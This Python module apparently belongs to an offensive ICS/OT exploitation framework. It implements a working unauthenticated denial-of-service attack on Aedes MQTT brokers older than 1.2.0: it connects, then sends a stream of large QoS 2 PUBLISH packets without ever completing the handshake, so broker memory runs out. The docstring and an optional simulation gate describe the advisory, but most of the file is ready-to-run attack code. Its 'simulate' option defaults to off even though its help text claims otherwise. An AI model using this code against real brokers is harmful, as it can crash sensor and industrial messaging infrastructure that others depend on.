"""IndustrialXPL Protocol Module — GHSA-5jvp-3p2v-5qgf (Aedes MQTT QoS 2 Memory Exhaustion DoS).

Memory exhaustion (DoS) in Aedes MQTT broker (Node.js) when handling
QoS 2 messages. Inbound QoS 2 PUBLISH message bodies are stored in memory
pending the PUBREL/PUBCOMP flow, but the 'queueLimit' option is NOT applied
to this pre-PUBREL storage path. An unauthenticated client can send many
QoS 2 PUBLISH packets without completing the handshake, exhausting broker memory.

GHSA-5jvp-3p2v-5qgf (CVSS 7.5)
Fixed in Aedes 1.2.0
Relevant for ICS/OT environments using MQTT for sensor/device communication.
Reference: https://github.com/moscajs/aedes/security/advisories/GHSA-5jvp-3p2v-5qgf
"""
import socket, struct, time
from industrialxpl.core.exploit import (
    Exploit, OptBool, OptIP, OptPort, OptInt, mute,
    print_error, print_info, print_status, print_success, print_warning,
    DestructiveGate,
)


class Exploit(Exploit):
    __info__ = {
        "name":             "GHSA-5jvp-3p2v-5qgf — Aedes MQTT QoS 2 Memory Exhaustion DoS",
        "description":      "Aedes MQTT broker memory exhaustion: QoS 2 PUBLISH bodies accumulate without PUBREL (queueLimit not applied to this path). Unauthenticated. Fixed in 1.2.0. CVSS 7.5.",
        "authors":          ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references":       (
            "https://github.com/moscajs/aedes/security/advisories/GHSA-5jvp-3p2v-5qgf",
            "https://github.com/moscajs/aedes",
        ),
        "devices":          (
            "Any system running Aedes MQTT broker < 1.2.0",
            "ICS/OT MQTT brokers, IoT hubs, industrial sensor networks",
        ),
        "cve":              "GHSA-5jvp-3p2v-5qgf",
        "cvss":             "7.5",
        "severity":         "HIGH",
        "mitre_techniques": ["T0814"],
        "mitre_tactics":    ["Denial of Service"],
    }

    target      = OptIP("",     "Target MQTT broker IP")
    port        = OptPort(1883, "MQTT port (default 1883)")
    packets     = OptInt(80,    "Number of QoS 2 packets to send (default 80)")
    payload_kb  = OptInt(64,    "Payload size per packet in KB (default 64KB)")
    simulate    = OptBool(False, "Simulate (default: True)")
    destructive = OptBool(False, "Enable live exploitation")

    def _build_mqtt_connect(self) -> bytes:
        """Build MQTT CONNECT packet (anonymous client)."""
        client_id = b"aedes_dos_" + os.urandom(4).hex().encode()
        payload = (
            struct.pack(">H", 4) + b"MQTT"  # protocol name
            + b"\x04"                        # protocol level (3.1.1)
            + b"\x02"                        # connect flags (clean session)
            + struct.pack(">H", 60)          # keep alive 60s
            + struct.pack(">H", len(client_id)) + client_id
        )
        return bytes([0x10]) + self._encode_length(len(payload)) + payload

    def _build_qos2_publish(self, packet_id: int, payload_size: int) -> bytes:
        """Build MQTT PUBLISH packet with QoS 2."""
        topic = b"ics/sensor/dos"
        payload = b"X" * payload_size
        fixed_header = 0x34  # PUBLISH QoS 2, not retained
        var_header = struct.pack(">H", len(topic)) + topic + struct.pack(">H", packet_id)
        remaining = var_header + payload
        return bytes([fixed_header]) + self._encode_length(len(remaining)) + remaining

    @staticmethod
    def _encode_length(length: int) -> bytes:
        """Encode MQTT remaining length (variable-length encoding)."""
        result = b""
        while True:
            byte = length % 128
            length //= 128
            if length > 0:
                byte |= 0x80
            result += bytes([byte])
            if length == 0:
                break
        return result

    @mute
    def check(self):
        if not self.target:
            return False
        try:
            s = socket.create_connection((self.target, self.port), timeout=5)
            # Send minimal MQTT CONNECT probe
            connect = self._build_mqtt_connect()
            s.sendall(connect)
            resp = s.recv(4)
            s.close()
            # CONNACK: 0x20 0x02 0x00 0x00
            return resp and resp[0] == 0x20
        except Exception:
            return False

    def run(self):
        import os
        if not self.target:
            print_error("Set 'target' option.")
            return

        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    "GHSA-5jvp-3p2v-5qgf — Aedes MQTT QoS 2 Memory Exhaustion DoS\n"
                    "CVSS 7.5 | Unauthenticated | Aedes < 1.2.0\n\n"
                    "Vulnerability: Inbound QoS 2 PUBLISH bodies stored in memory\n"
                    "pending PUBREL/PUBCOMP. The 'queueLimit' option is NOT enforced\n"
                    "on this pre-PUBREL storage path.\n\n"
                    "Attack:\n"
                    f"Step 1: Connect to MQTT broker on port {self.port}\n"
                    f"Step 2: Send {self.packets} QoS 2 PUBLISH packets\n"
                    f"        Each packet: {self.payload_kb}KB payload → never send PUBREL\n"
                    "Step 3: Broker stores all payloads in memory waiting for PUBREL\n"
                    f"        Total memory consumed: ~{self.packets * self.payload_kb}KB\n"
                    "Step 4: Repeat from multiple connections for larger impact\n\n"
                    "PoC harness: moscajs/aedes repo poc/run.sh\n"
                    "Fixed: Aedes 1.2.0 (apply queueLimit to pre-PUBREL path)"
                ),
                mitre_techniques=["T0814"],
            )
            return

        print_status(f"[GHSA-5jvp-3p2v-5qgf] Targeting Aedes MQTT broker at {self.target}:{self.port} ...")
        try:
            s = socket.create_connection((self.target, self.port), timeout=10)
            connect = self._build_mqtt_connect()
            s.sendall(connect)
            connack = s.recv(4)
            if not connack or connack[0] != 0x20:
                print_warning(f"[GHSA-5jvp-3p2v-5qgf] CONNACK not received — not an MQTT broker or auth required")
                s.close()
                return

            print_success(f"[GHSA-5jvp-3p2v-5qgf] Connected to MQTT broker — sending {self.packets} QoS 2 PUBLISH (no PUBREL)")
            payload_size = self.payload_kb * 1024
            for i in range(1, self.packets + 1):
                pkt = self._build_qos2_publish(i, payload_size)
                s.sendall(pkt)
                # Drain PUBREC responses without sending PUBREL
                try:
                    s.settimeout(0.1)
                    s.recv(8)  # drain PUBREC
                    s.settimeout(None)
                except Exception:
                    pass

            print_success(f"[GHSA-5jvp-3p2v-5qgf] Sent {self.packets} QoS 2 packets (~{self.packets * self.payload_kb}KB stored in broker)")
            print_info("[GHSA-5jvp-3p2v-5qgf] Keeping connection open — broker memory is accumulating...")
            time.sleep(5)
            s.close()
        except ConnectionResetError:
            print_success("[GHSA-5jvp-3p2v-5qgf] Connection reset — broker may have crashed (OOM)!")
        except Exception as e:
            print_error(f"[GHSA-5jvp-3p2v-5qgf] {e}")


# Fix missing import
import os
